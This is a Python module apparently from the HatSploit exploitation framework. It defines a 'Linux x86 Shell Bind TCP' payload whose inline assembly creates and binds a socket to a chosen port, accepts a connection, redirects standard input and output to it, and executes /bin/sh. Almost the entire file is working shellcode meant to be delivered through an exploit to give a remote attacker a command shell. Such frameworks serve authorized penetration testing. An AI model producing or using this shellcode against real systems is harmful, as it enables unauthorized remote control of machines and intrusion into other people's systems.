"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pex.assembler import Assembler
from pex.socket import Socket

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, Assembler, Socket):
    details = {
        'Name': "Linux x86 Shell Bind TCP",
        'Payload': "linux/x86/shell_bind_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer',
        ],
        'Description': "Shell bind TCP payload for Linux x86.",
        'Architecture': "x86",
        'Platform': "linux",
        'Rank': "high",
        'Type': "bind_tcp",
    }

    def run(self):
        bport = self.pack_port(self.handler['BPORT'])

        return self.assemble(
            self.details['Architecture'],
            f"""
            start:
                xor ebx, ebx
                mul ebx
                push ebx
                inc ebx
                push ebx
                push 0x2
                mov ecx, esp
                mov al, 0x66
                int 0x80

                pop ebx
                pop esi
                push edx
                push 0x{bport.hex()}0002
                push 0x10
                push ecx
                push eax
                mov ecx, esp
                push 0x66
                pop eax
                int 0x80

                mov dword ptr [ecx + 4], eax
                mov bl, 0x4
                mov al, 0x66
                int 0x80

                inc ebx
                mov al, 0x66
                int 0x80

                xchg ebx, eax
                pop ecx

            dup:
                dec ecx
                push 0x3f
                pop eax
                int 0x80

                jns dup
                push 0x68732f2f
                push 0x6e69622f
                mov ebx, esp
                push eax
                push ebx
                mov ecx, esp
                mov al, 0xb
                int 0x80
            """
        )
